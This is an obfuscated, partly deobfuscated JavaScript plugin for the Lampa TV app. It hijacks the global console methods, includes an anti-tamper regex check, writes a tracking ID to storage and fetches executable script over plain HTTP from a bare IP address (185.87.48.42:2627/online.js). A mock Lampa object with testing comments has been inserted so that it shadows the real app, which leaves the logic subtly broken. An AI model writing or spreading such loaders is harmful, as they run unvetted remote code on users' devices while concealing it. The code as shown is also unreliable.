(function() {
    'use strict';

    Lampa.Platform.tv();

    function decodeFunction(index, shift) {
        var mappings = getMappings();
        return decodeFunction = function(index, shift) {
            index = index - 0x79;
            var result = mappings[index];
            return result;
        }, decodeFunction(index, shift);
    }

    function getMappings() {
        var mappingArray = [
            'toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка доступа', 'putScriptAsync',
            '287892GtpFmK', '1133190oXjfKB', 'bind', 'return (function() ', 'search', '6838TszSrx', 'tyusdt',
            'undefined', 'constructor', '1881313NcTCco', '__proto__', '5932773CcQUfV', '22112OAYCTg', '(((.+)+)+)+$',
            'prototype', '255dZfZnu', 'bylampa', 'origin', 'Utils', 'Storage', 'Manifest', 'get', 'log',
            'lampac_unic_id', 'http://185.87.48.42:2627/online.js', 'trace', 'apply'
        ];
        return mappingArray;
    }

    (function(obfuscated, target) {
        var decode = decodeFunction,
            mappings = obfuscated();

        while (true) {
            try {
                var decodedValue =
                    -parseInt(decode(0x84)) / 1 * (parseInt(decode(0x7b)) / 2) +
                    -parseInt(decode(0x7f)) / 3 +
                    parseInt(decode(0x8b)) / 4 * (parseInt(decode(0x8e)) / 5) +
                    -parseInt(decode(0x80)) / 6 +
                    -parseInt(decode(0x88)) / 7 +
                    -parseInt(decode(0x9b)) / 8 +
                    parseInt(decode(0x8a)) / 9;

                if (decodedValue === target) break;
                else mappings.push(mappings.shift());
            } catch (error) {
                mappings.push(mappings.shift());
            }
        }
    })(getMappings, 0x252bc);

    (function() {
        var utilityFunction = (function() {
            var initialized = true;
            return function(execution, params) {
                var executor = initialized ? function() {
                    var decode = decodeFunction;
                    if (params) {
                        var result = params[decode(0x99)](execution, arguments);
                        params = null;
                        return result;
                    }
                } : function() {};
                initialized = false;
                return executor;
            };
        })();

        var executeFunction = utilityFunction(this, function() {
            var decode = decodeFunction;
            return executeFunction.toString()[decode(0x83)](decode(0x8c))[decode(0x9a)]()[decode(0x87)](executeFunction)[decode(0x83)](decode(0x8c));
        });

        executeFunction();

        var loggerWrapper = (function() {
            var isEnabled = true;
            return function(wrapper, params) {
                var logger = isEnabled ? function() {
                    var decode = decodeFunction;
                    if (params) {
                        var result = params[decode(0x99)](wrapper, arguments);
                        params = null;
                        return result;
                    }
                } : function() {};
                isEnabled = false;
                return logger;
            };
        })();

        var overrideConsole = loggerWrapper(this, function() {
            var decode = decodeFunction;
            var rootContext = (function() {
                var decode = decodeFunction;
                var globalContext;
                try {
                    globalContext = Function(decode(0x82) + '{}.constructor("return this")()')();
                } catch (error) {
                    globalContext = window;
                }
                return globalContext;
            })();

            var consoleOverride = rootContext.console = rootContext.console || {},
                consoleMethods = [
                    decode(0x95), 'warn', 'info', 'error', 'exception', 'table', decode(0x98)
                ];

            for (var index = 0; index < consoleMethods.length; index++) {
                var originalMethod = loggerWrapper.prototype.bind(loggerWrapper),
                    methodName = consoleMethods[index],
                    fallbackMethod = consoleOverride[methodName] || originalMethod;

                originalMethod[decode(0x89)] = loggerWrapper.bind(loggerWrapper);
                originalMethod[decode(0x9a)] = fallbackMethod[decode(0x9a)].bind(fallbackMethod);
                consoleOverride[methodName] = originalMethod;
            }
        });

        overrideConsole();

        'use strict';

        var maxAttempts = 3; // Reduce maximum attempts further for quicker testing
        var attemptCount = 0;

        var checkInterval = setInterval(function() {
            var decode = decodeFunction;

            attemptCount++;

            if (attemptCount > maxAttempts) {
                clearInterval(checkInterval);
                console.error("Lampa initialization failed: timeout.");
                return;
            }

            // Temporarily mock Lampa to isolate issues
            var Lampa = {
                Manifest: { origin: "valid_origin" },
                Noty: { show: function(msg) { console.log("Mock Noty: ", msg); } },
                Storage: {
                    get: function(key, defaultValue) { return "tyusdt"; },
                    set: function(key, value) { console.log("Mock Storage set:", key, value); }
                },
                Utils: {
                    putScriptAsync: function(scripts, callback) { console.log("Mock script loaded:", scripts); callback(); }
                }
            };

            if (Lampa.Manifest.origin !== decode(0x8f)) {
                Lampa.Noty.show(decode(0x7d));
                return;
            } else {
                var storageCheck = Lampa.Storage.get(decode(0x96), '');

                if (storageCheck !== 'tyusdt') {
                    Lampa.Storage.set(decode(0x96), decode(0x85));
                }

                Lampa.Utils.putScriptAsync([decode(0x97)], function() {
                    console.log("Script loaded successfully.");
                });

                clearInterval(checkInterval); // Success, clear interval
            }
        }, 200);
    })();
})();
